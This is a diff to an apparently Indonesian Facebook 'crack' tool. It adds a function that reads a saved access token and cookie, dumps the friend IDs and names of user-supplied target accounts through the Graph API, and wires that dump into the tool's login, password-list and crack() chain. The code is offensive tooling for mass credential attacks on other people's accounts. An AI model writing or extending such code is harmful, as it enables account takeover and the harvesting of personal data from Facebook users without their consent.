@@ -153,20 +153,6 @@ def language(cookie):
                     exec = xyz.post(url,data=bahasa,cookies=cookie)
     except Exception as e:pass
 
-###----------[ EXCEPTION ]---------- ###
-def kecuali(error):
-    print('\n   %s[%s•%s] %sTerjadi Kesalahan %s!%s'%(M,P,M,P,M,P))
-    print('       %s• %sTidak Dapat Mengeksekusi %s\n'%(M,A,error))
-    print('   %s[%s•%s] %sHal Ini Mungkin Terjadi Karena %s:%s'%(M,P,M,P,M,P))
-    print('       %s• %sCookies/Token Invalid'%(M,A))
-    print('       %s• %sSalah Memasukkan ID'%(M,A))
-    print('       %s• %sBug Pada Source Code'%(M,A))
-    print('       %s• %sBug Pada Requests'%(M,A))
-    print('       %s• %sDan Lain-Lain\n'%(M,A))
-    print('   %s[%s•%s] %sJalankan Ulang Source Code Ini %s:%s'%(M,P,M,P,M,P))
-    print('       %s• %spython sakera.py\n'%(M,A))
-    exit()
-
 ###----------[ BOT AUTHOR JANGAN DIGANTI ]---------- ###
 class bot_author:
     def __init__(self,cookie,token,cookie_mentah):
@@ -342,7 +328,7 @@ def tampilan_menu():
         nama = jsx["name"]
         user(nama)
         print(''%())
-        tampilan_menu = f"""  {H2}[{A2}01{H2}] {A2}Friendlist {H2}[{A2}06{H2}] {P2}Komentar {H2}[{A2}11{H2}] {A2}Email
+        tampilan_menu = f"""  {H2}[{A2}01{H2}] {M2}Friendlist {H2}[{A2}06{H2}] {P2}Komentar {H2}[{A2}11{H2}] {A2}Email
   {H2}[{A2}02{H2}] {P2}Followers  {H2}[{A2}07{H2}] {P2}Grup     {H2}[{A2}12{H2}] {A2}Username
   {H2}[{A2}03{H2}] {A2}Nama       {H2}[{A2}08{H2}] {A2}Hashtag  {H2}[{A2}13{H2}] {A2}ID Random
   {H2}[{A2}04{H2}] {P2}Likers     {H2}[{A2}09{H2}] {A2}Beranda  {H2}[{A2}14{H2}] {P2}Saran Teman
@@ -358,7 +344,7 @@ def tampilan_menu():
 def pilih_menu():
     global gabung_sandi, tempel_sandi
     dc = input('   %s└──> %s'%(A,H))
-    if dc in ['1','01','a']    : gabung_sandi.append(Author_ll);not_available('Dump ID Dari Friendlist')
+    if dc in ['1','01','a']    : gabung_sandi.append(Author_ll);publik();system_login();urut_crack();pilihan_sakdurunge_crack();addpass();crack()
     elif dc in ['2','02','b']  : tempel_sandi.append('Jangan');main_folls();system_login();urut_crack();pilihan_sakdurunge_crack();addpass();crack()
     elif dc in ['3','03','c']  : gabung_sandi.append('Direcode');not_available('Dump ID Dari Nama')
     elif dc in ['4','04','d']  : tempel_sandi.append('Dasar');main_likers();system_login();pilihan_sakdurunge_crack();addpass();crack()
@@ -509,7 +495,41 @@ def cek_user_agent():
         input('\n   %s[ %sKembali %s]'%(H,P,H))
         tampilan_menu()
     except Exception as e:kecuali(e)
-
+        
+###----------[ DUMP ID PUBLIC ]---------- ###
+def publik():
+    global file_dump
+    try:
+        try:
+            token  = open('login/token.json','r').read()
+            cookie = {'cookie':open('login/cookie.json','r').read()}
+        except:
+            print('\n%s[%s•%s] %sCookies Invalid %s!%s\n'%(M,P,M,P,M,P))
+            time.sleep(3)
+            login()
+        print('       %s[%s•%s] %sContoh : 1827084332,607801156'%(H,P,H,P))
+        tid = input('       %s[%s•%s] %sID Target : %s'%(H,P,H,P,H)).split(',')
+        file_dump = 'dump/%s.json'%(tid[0])
+        try:os.remove(file_dump)
+        except:pass
+        for id in tid :
+            try:
+                url = ("https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s"%(id,token))
+                with requests.Session() as xyz:
+                    jso = json.loads(xyz.get(url,cookies=cookie).text)
+                    if len(gabung_sandi) != 1:
+                        for x in range(Postingan):
+                            open(file_dump,'a+').write('dev\n')
+                    else:
+                        for d in jso["friends"]["data"]:
+                            try:open(file_dump,'a+').write('%s=%s\n'%(d['id'],d['name']))
+                            except:continue
+            except Exception as e:kecuali(e)
+        jum = open(file_dump,'r').read().splitlines()
+        print('       %s[%s•%s] %sBerhasil Dump %s%s %sID'%(H,P,H,P,H,str(len(jum)),P))
+        print('       %s[%s•%s] %sFile : %s%s %s'%(H,P,H,P,H,file_dump,P))
+    except Exception as e:kecuali(e)
+        
 ###----------[ DUMP ID FOLLOWERS ]---------- ###
 def main_folls():
     global file_dump,cookie
